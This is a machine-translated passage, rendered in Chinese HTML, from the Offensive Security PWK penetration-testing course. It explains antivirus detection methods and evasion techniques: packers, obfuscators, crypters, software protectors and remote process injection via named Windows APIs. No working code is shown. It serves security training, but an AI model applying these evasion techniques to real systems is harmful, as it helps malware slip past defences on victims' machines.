<div style="position:absolute;top:59278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被隔离。</font><font style="vertical-align: inherit;">这意味着，使用正确的工具，我们可以绕过依赖于</font></font></nobr></div>
<div style="position:absolute;top:59298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种检测方法还算轻松。</font><font style="vertical-align: inherit;">具体来说，我们可以简单地绕过基于签名的检测</font></font></nobr></div>
<div style="position:absolute;top:59317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改或混淆已知恶意文件的内容以破坏识别字节</font></font></nobr></div>
<div style="position:absolute;top:59337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">序列（或签名）。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:59447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">407 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（VirusTotal，2019），https://www.virustotal.com/#/home/upload</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:59575;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="51"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 51 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:59608;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:60685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:60685;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:60685;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">492</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:59704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据被测试的杀毒软件的类型和质量，有时我们可以绕过</font></font></nobr></div>
<div style="position:absolute;top:59723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防病毒软件只需更改二进制文件中的几个无害字符串即可</font></font></nobr></div>
<div style="position:absolute;top:59742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大写到小写。</font><font style="vertical-align: inherit;">然而，并不是每个案例都这么简单。</font></font></nobr></div>
<div style="position:absolute;top:59775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于防病毒软件供应商使用不同的签名和专有技术来检测</font></font></nobr></div>
<div style="position:absolute;top:59795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">恶意软件，每个供应商都会不断更新他们的数据库，通常很难想出</font></font></nobr></div>
<div style="position:absolute;top:59814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个包罗万象的防病毒逃避解决方案。</font><font style="vertical-align: inherit;">很多时候，这个过程是基于反复试验</font></font></nobr></div>
<div style="position:absolute;top:59833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试环境中的方法。</font></font></nobr></div>
<div style="position:absolute;top:59866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出于这个原因，在渗透测试期间，我们应该确定存在、类型和版本</font></font></nobr></div>
<div style="position:absolute;top:59885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在考虑绕过策略之前部署了防病毒软件。</font><font style="vertical-align: inherit;">如果客户端网络或系统</font></font></nobr></div>
<div style="position:absolute;top:59905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实施杀毒软件，我们应该收集尽可能多的信息并复制</font></font></nobr></div>
<div style="position:absolute;top:59924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在将文件上传到目标之前，在实验室环境中进行 AV 绕过测试的配置</font></font></nobr></div>
<div style="position:absolute;top:59944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:59978;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:59978;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启发式和基于行为的检测</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了解决基于签名的检测的缺陷，防病毒制造商引入了额外的</font></font></nobr></div>
<div style="position:absolute;top:60035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测方法以提高其产品的有效性。</font></font></nobr></div>
<div style="position:absolute;top:60068;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Heuristic-Based Detection </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">408</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一种依赖于各种规则和算法的检测方法</font></font></nobr></div>
<div style="position:absolute;top:60087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定某个操作是否被视为恶意操作。</font><font style="vertical-align: inherit;">这通常是通过步进来实现的</font></font></nobr></div>
<div style="position:absolute;top:60107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过二进制文件的指令集或通过尝试反编译然后分析</font></font></nobr></div>
<div style="position:absolute;top:60126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">源代码。</font><font style="vertical-align: inherit;">这个想法是寻找各种模式和程序调用（而不是简单的字节</font></font></nobr></div>
<div style="position:absolute;top:60146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">序列）被认为是恶意的。</font></font></nobr></div>
<div style="position:absolute;top:60178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或者，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于行为的检测</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">409</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">动态分析二进制文件的行为。</font><font style="vertical-align: inherit;">这是</font></font></nobr></div>
<div style="position:absolute;top:60198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常通过在模拟环境（例如小型虚拟环境）中执行相关文件来实现</font></font></nobr></div>
<div style="position:absolute;top:60217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器，并寻找被视为恶意的行为或操作。</font></font></nobr></div>
<div style="position:absolute;top:60250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于这些技术不需要恶意软件签名，因此它们可用于识别未知</font></font></nobr></div>
<div style="position:absolute;top:60269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">恶意软件或已知恶意软件的变体，更有效。</font><font style="vertical-align: inherit;">鉴于防病毒制造商使用</font></font></nobr></div>
<div style="position:absolute;top:60288;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在启发式和行为检测方面的不同实现，每个防病毒软件</font></font></nobr></div>
<div style="position:absolute;top:60308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">产品在哪些代码被认为是恶意的方面会有所不同。</font></font></nobr></div>
<div style="position:absolute;top:60341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值得注意的是，大多数杀毒软件开发者都使用这些检测的组合</font></font></nobr></div>
<div style="position:absolute;top:60360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法来实现更高的检测率。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:60397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3 绕过防病毒检测</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一般来说，防病毒规避分为两大类：磁盘上和内存中。</font><font style="vertical-align: inherit;">上-</font></font></nobr></div>
<div style="position:absolute;top:60458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘规避侧重于修改物理存储在磁盘上的恶意文件以试图规避</font></font></nobr></div>
<div style="position:absolute;top:60477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AV 检测。</font><font style="vertical-align: inherit;">鉴于 AV 文件扫描的成熟，现代恶意软件经常尝试在内存中</font></font></nobr></div>
<div style="position:absolute;top:60497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作，完全避开磁盘，从而降低被检测到的可能性。</font><font style="vertical-align: inherit;">在里面</font></font></nobr></div>
<div style="position:absolute;top:60516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在接下来的部分中，我们将对这两种方法中使用的一些技术进行非常概括的概述</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:60615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">408 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Heuristic_analysis</font></font></font></nobr></div>
<div style="position:absolute;top:60635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">409 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（特里斯坦·奥布里-琼斯，2007 年），https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:60763;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="52"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 52 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:60796;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:61873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:61873;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:61873;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">493</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些方法。</font><font style="vertical-align: inherit;">请注意，有关这些技术的详细信息超出了本文的范围</font></font></nobr></div>
<div style="position:absolute;top:60911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:60946;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.1</font></font></i></nobr></div>
<div style="position:absolute;top:60946;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘规避</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了开始我们对逃避的讨论，我们将首先看看用于混淆文件的各种技术</font></font></nobr></div>
<div style="position:absolute;top:61003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在物理磁盘上。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:61037;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.1.1 包装工</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现代磁盘恶意软件混淆可以采用多种形式。</font><font style="vertical-align: inherit;">最早避免的方法之一</font></font></nobr></div>
<div style="position:absolute;top:61091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测涉及使用封隔器。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">410</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑到磁盘空间的高成本和缓慢的网络速度</font></font></nobr></div>
<div style="position:absolute;top:61110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Internet 的早期，打包程序最初的设计目的是简单地减小</font></font></nobr></div>
<div style="position:absolute;top:61130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个可执行文件。</font><font style="vertical-align: inherit;">与现代的“zip”压缩技术不同，打包程序生成一个可执行文件，</font></font></nobr></div>
<div style="position:absolute;top:61149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不仅更小，而且在功能上与全新的二进制结构等效。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:61168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果文件有一个新的签名，因此可以有效地绕过旧的和更简单的</font></font></nobr></div>
<div style="position:absolute;top:61188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AV 扫描仪。</font><font style="vertical-align: inherit;">尽管一些现代恶意软件使用了这种技术的变体，但使用</font></font></nobr></div>
<div style="position:absolute;top:61207;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅靠</font><i><font style="vertical-align: inherit;">UPX </font></i></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">411</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和其他流行的打包程序不足以躲避现代 AV 扫描仪。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:61241;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.1.2 混淆器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">混淆器以一种使逆向工程变得更加困难的方式重组和改变代码。</font></font></nobr></div>
<div style="position:absolute;top:61295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这包括用语义等效的指令替换指令，插入不相关的指令</font></font></nobr></div>
<div style="position:absolute;top:61315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指令或“死代码”、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">412</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拆分或重新排序功能等。</font><font style="vertical-align: inherit;">虽然主要用于</font></font></nobr></div>
<div style="position:absolute;top:61334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由软件开发人员保护他们的知识产权，这种技术也很少</font></font></nobr></div>
<div style="position:absolute;top:61353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效对抗基于签名的 AV 检测。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:61388;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.1.3 加密器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“Crypter”软件以密码方式更改可执行代码，添加解密存根以恢复</font></font></nobr></div>
<div style="position:absolute;top:61442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行时的原始代码。</font><font style="vertical-align: inherit;">这种解密发生在内存中，只留下加密的</font></font></nobr></div>
<div style="position:absolute;top:61461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘上的代码。</font><font style="vertical-align: inherit;">加密已成为现代恶意软件的基础，是最有效的加密方法之一</font></font></nobr></div>
<div style="position:absolute;top:61480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AV 规避技术。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:61515;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.1.4 软件保护程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高效的防病毒规避需要结合之前的所有技术</font></font></nobr></div>
<div style="position:absolute;top:61569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了其他高级的，包括反倒转、反调试、虚拟机</font></font></nobr></div>
<div style="position:absolute;top:61588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仿真检测等。</font><font style="vertical-align: inherit;">在大多数情况下，软件保护程序是为合法的</font></font></nobr></div>
<div style="position:absolute;top:61607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目的，但也可用于绕过 AV 检测。</font></font></nobr></div>
<div style="position:absolute;top:61640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数这些技术在高层次上可能看起来很简单，但实际上它们非常复杂。</font></font></nobr></div>
<div style="position:absolute;top:61659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因此，目前很少有积极维护的免费工具提供可接受的</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:61783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">410 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Executable_compression</font></font></font></nobr></div>
<div style="position:absolute;top:61803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">411 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（UPX，2018），https://upx.github.io/</font></font></font></nobr></div>
<div style="position:absolute;top:61823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">412 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Dead_code</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:61951;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="53"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 53 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:61984;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:63061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:63061;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:63061;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">494</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防病毒逃避。</font><font style="vertical-align: inherit;">在市售工具中，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enigma Protector </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">413</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尤其可以</font></font></nobr></div>
<div style="position:absolute;top:62099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功地被用来绕过防病毒产品。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:62134;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.2</font></font></i></nobr></div>
<div style="position:absolute;top:62134;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内存中规避</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62172;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内存中注入</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">414</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PE 注入，</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一种用于绕过防病毒软件的流行技术</font></font></nobr></div>
<div style="position:absolute;top:62191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">产品。</font><font style="vertical-align: inherit;">而不是混淆恶意二进制文件、创建新部分或更改现有</font></font></nobr></div>
<div style="position:absolute;top:62210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限，这种技术反而侧重于易失性内存的操作。</font><font style="vertical-align: inherit;">其中一个</font></font></nobr></div>
<div style="position:absolute;top:62230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种技术的主要好处是它不会将任何文件写入磁盘，这是主要领域之一</font></font></nobr></div>
<div style="position:absolute;top:62249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数防病毒产品的重点。</font></font></nobr></div>
<div style="position:absolute;top:62282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有几种</font><font style="vertical-align: inherit;">不将文件写入磁盘的</font><font style="vertical-align: inherit;">规避技术</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">415</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">虽然我们将提供一个简短的</font></font></nobr></div>
<div style="position:absolute;top:62301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对其中一些的解释，在本模块中，我们将只介绍使用</font></font></nobr></div>
<div style="position:absolute;top:62320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 的细节，因为其他人依赖于语言的低级编程背景，例如</font></font></nobr></div>
<div style="position:absolute;top:62340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C/C++ 并且不在本模块的范围内。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:62374;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.2.1 远程进程内存注入</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此技术尝试将有效负载注入另一个非恶意的有效 PE。</font><font style="vertical-align: inherit;">最多</font></font></nobr></div>
<div style="position:absolute;top:62428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行此操作的常用方法是利用一组 Windows API。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">416</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将使用</font></font></nobr></div>
<div style="position:absolute;top:62447;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpenProcess </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">417</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数获取</font><font style="vertical-align: inherit;">到我们有权限的目标进程</font><font style="vertical-align: inherit;">的有效</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">句柄</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">418</font></font></font><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:62467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问。</font><font style="vertical-align: inherit;">获得 HANDLE 后，我们将在该进程的上下文中分配内存</font></font></nobr></div>
<div style="position:absolute;top:62486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过调用诸如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VirtualAllocEx 之</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类的 Windows API </font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">419</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当内存中被分配</font></font></nobr></div>
<div style="position:absolute;top:62505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程进程，我们会将恶意负载复制到新分配的内存中</font></font></nobr></div>
<div style="position:absolute;top:62525;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">写入进程内存</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">420</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷复制成功后，通常在</font></font></nobr></div>
<div style="position:absolute;top:62544;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CreateRemoteThread </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">421</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> API</font><font style="vertical-align: inherit;">在单独的线程中</font><i><font style="vertical-align: inherit;">分配</font></i><font style="vertical-align: inherit;">内存</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:62577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这听起来很复杂，但我们将在以下示例中使用类似的技术，使用</font></font></nobr></div>
<div style="position:absolute;top:62596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 完成大部分繁重工作并执行非常相似但简化的攻击目标</font></font></nobr></div>
<div style="position:absolute;top:62615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实例。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:62823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">413 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Enigma Protector，2019），http://www.enigmaprotector.com/en/home.html</font></font></font></nobr></div>
<div style="position:absolute;top:62843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">414 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Endgame，2017），https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:62857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和趋势过程</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
